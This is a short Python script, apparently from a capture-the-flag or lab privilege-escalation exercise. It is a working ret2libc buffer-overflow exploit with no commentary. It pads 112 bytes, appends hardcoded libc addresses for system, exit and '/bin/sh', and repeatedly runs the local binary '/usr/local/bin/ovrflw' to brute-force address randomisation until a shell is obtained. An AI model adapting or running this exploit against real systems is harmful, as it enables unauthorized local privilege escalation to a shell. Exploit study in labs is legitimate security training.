#!/usr/bin/python3
# coding: utf-8

from struct import pack
from subprocess import call
import sys
import signal

def def_handler(sig, frame):
	print("\n\n[!]Saindo...\n\n")
	sys.exit(1)

# Ctrl + C
signal.signal(signal.SIGINT, def_handler)

# Variable_Global

offset = 112
libc = 0xb7558000
system = 0x00040310
exit = 0x00033260
bin_sh = 0x00162bac

def exploit():

	junk = b"A" * offset
	system_offset = pack("<I", system + libc)
	exit_offset = pack("<I", exit + libc)
	bin_sh_offset = pack("<I", bin_sh + libc)

	payload = junk + system_offset + exit_offset + bin_sh_offset

	return payload
	
if __name__ == '__main__':
	bof = exploit()

	while True:

		offsec = call(['/usr/local/bin/ovrflw', bof])

		if offsec == 0:
			print("\n\n[!]Saindo...\n\n")
			sys.exit(0)
